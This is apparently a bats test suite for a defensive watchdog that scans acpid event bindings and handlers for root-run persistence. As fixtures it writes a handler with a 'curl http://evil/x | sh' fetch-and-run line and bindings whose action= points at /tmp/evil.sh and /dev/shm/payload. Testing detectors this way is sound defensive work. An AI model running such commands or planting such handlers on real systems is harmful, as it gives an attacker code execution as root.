#!/usr/bin/env bats
# L2 bats functional tests for the acpi-hooks-watchdog scan script.
#
# acpid runs the bound action AS ROOT on each ACPI hardware event (power
# button, lid, AC adapter, thermal): /etc/acpi/events/* bind an event to
# `action=<cmd>`, /etc/acpi/actions/* + /etc/acpi/*.sh are the handlers. A
# dropped handler — or a new binding whose `action=` points at attacker
# code — self-triggers on routine hardware activity (T1546).
#
# Notably this LOCKS the module-specific pattern SDD-061 D-6 preserved
# verbatim as a PATTERNS+=(...) extra — the acpid `action=<writable>`
# pattern (the path follows `=`, which the generic command-position rule
# misses) — proving the preserved extra still detects after migration.
#
# Runs the actual scan script with `logger` shadowed on PATH and the
# events dir + baseline in a tmp sandbox via SELFDEF_ACPI_*; locks the
# `"severity":"alert"` token SDD-062 routes on + the D-6 fail-loud path.
#
# Run with: bats packaging/test/L2-acpi-hooks-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/acpi-hooks-watchdog/systemd/acpi-hooks-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    EVENTS="${TMP}/events"; mkdir -p "${EVENTS}"
    BIND="${EVENTS}/powerbtn"
    NOGLOB="${TMP}/none/*.sh"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_ACPI_PROFILE="${PROFILE:-report}" \
    SELFDEF_ACPI_BASELINE="${BASELINE}" \
    SELFDEF_ACPI_DIRS="${DIRS:-$EVENTS}" \
    SELFDEF_ACPI_GLOB="${NOGLOB}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no acpi hooks present → ok / no_acpi_hooks" {
    DIRS="${TMP}/empty-nonexistent" run_wd
    cap | grep -q '"event":"no_acpi_hooks"'
    cap | grep -q '"severity":"ok"'
}

@test "benign event binding, first run → ok / baseline_initial" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged hooks on second run → ok / acpi_hooks_intact" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"acpi_hooks_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier — incl. the PRESERVED action= extra
# ============================================================

@test "event binding with action= under a writable root → alert (preserved extra)" {
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "event binding with a quoted writable action= → alert (preserved extra)" {
    printf 'event=ac_adapter\naction="/dev/shm/payload"\n' > "${BIND}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "handler containing a curl|sh payload → alert (canonical pattern)" {
    printf '#!/bin/sh\ncurl http://evil/x | sh\n' > "${EVENTS}/handler.sh"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "benign binding added after baseline → warn / acpi_hooks_changed" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    printf 'event=button/lid\naction=/etc/acpi/actions/lid.sh\n' > "${EVENTS}/lid"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"acpi_hooks_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "action= pointing under /etc/acpi is NOT flagged (no alert)" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

@test "a commented-out writable action= line is NOT flagged" {
    printf 'event=button/power\n# action=/tmp/evil.sh\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile + SDD-061 D-6 fail-loud
# ============================================================

@test "enforce profile exits non-zero on an alert" {
    printf 'event=button/power\naction=/tmp/evil.sh\n' > "${BIND}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf 'event=button/power\naction=/etc/acpi/actions/power.sh\n' > "${BIND}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}
